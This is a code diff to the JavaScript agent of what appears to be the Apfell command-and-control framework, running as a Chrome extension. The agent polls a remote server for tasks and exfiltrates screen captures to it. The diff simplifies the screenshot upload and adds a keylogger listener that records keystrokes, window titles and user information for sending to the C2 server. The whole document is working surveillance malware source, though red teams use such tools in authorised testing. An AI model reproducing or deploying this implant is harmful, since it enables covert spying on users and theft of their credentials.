@@ -2,6 +2,7 @@
 // Dictionary that holds outbound messages
 var out = [];
 let screencaptures = [];
+let logger = "";
 let loads = [];
 class customC2 extends baseC2{
     constructor(host, port, endpoint, ssl , interval){
@@ -79,7 +80,7 @@ function chunkArray(array, size) {
     return [array.slice(0,size), ...chunkArray(array.slice(size), size)];
 }
 
-setInterval(function(){
+function c2loop() {
     C2.postResponse();
     if (apfell.apfellid.length !== 0) {
         let request = {'action':'get_tasking', 'tasking_size': -1, 'delegates':[]};
@@ -90,7 +91,9 @@ setInterval(function(){
     } else {
         //console.log('Apfell id not set for tasking ' + apfell.apfellid);
     }
-}, C2.interval * 1000);
+}
+
+var mainloop = setInterval(c2loop, C2.interval * 1000);
 
 connection.onopen = function () {
     C2.checkIn();
@@ -147,52 +150,40 @@ connection.onmessage = function (e) {
                         if (equal === 0) {
                             // TODO: chunk the screencapture data
                             let raw = capture.image;
-                            let arrLength = raw.length;
-                            let temp = [];
-                            let chunkSize = 512000;
 
-                            if (chunkSize > raw.length) {
-                                temp.push(raw);
-                            } else {
-                                temp = chunkArray(raw, chunkSize);
-                            }
-
-                            // loop through the chunk array and send each one to apfell
-                            for (let j = 0; j < temp.length; j++) {
-                                let resp = {
-                                    'chunk_num': j+1,
-                                    'file_id': response.file_id,
-                                    'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
-                                    'task_id': capture.task_id,
-                                };
-
-                                let outer_response = {
-                                    'action':'post_response',
-                                    'responses':[resp],
-                                    'delegates':[]
-                                };
-
-                                let enc = JSON.stringify(outer_response);
-                                let final = apfell.apfellid + enc;
-                                let msg = btoa(unescape(encodeURIComponent(final)));
-                                out.push(msg);
-                            }
-
-                            let response = {
-                                'task_id':response.task_id,
-                                'user_output':'screencapture complete',
-                                'complete':true
+                            let resp = {
+                                'chunk_num': 1,
+                                'file_id': response.file_id,
+                                'chunk_data': raw,
+                                'task_id': capture.task_id,
                             };
-                            
+
                             let outer_response = {
                                 'action':'post_response',
-                                'responses':[response],
+                                'responses':[resp],
                                 'delegates':[]
                             };
 
                             let enc = JSON.stringify(outer_response);
                             let final = apfell.apfellid + enc;
                             let msg = btoa(unescape(encodeURIComponent(final)));
+                            out.push(msg);
+
+                            response = {
+                                'task_id':response.task_id,
+                                'user_output':'screencapture complete',
+                                'complete':true
+                            };
+                            
+                            outer_response = {
+                                'action':'post_response',
+                                'responses':[response],
+                                'delegates':[]
+                            };
+
+                            enc = JSON.stringify(outer_response);
+                            final = apfell.apfellid + enc;
+                            msg = btoa(unescape(encodeURIComponent(final)));
                             out.push(msg);
 
                             screencaptures[i] = {};
@@ -244,3 +235,19 @@ connection.onmessage = function (e) {
         }
     }
 };
+
+// Listener for keylogger
+chrome.runtime.onConnect.addListener(function(port) {
+    if (port.name === "keylogger") {
+        port.onMessage.addListener(function(msg) {
+            let kmsg = {
+                "task_id": logger,
+                "user": apfell.userinfo,
+                "window_title": port.MessageSender.tabs.Tab.title,
+                "keystrokes": JSON.stringify(msg)
+            };
+    
+            out.push(kmsg);
+        });
+    }
+});
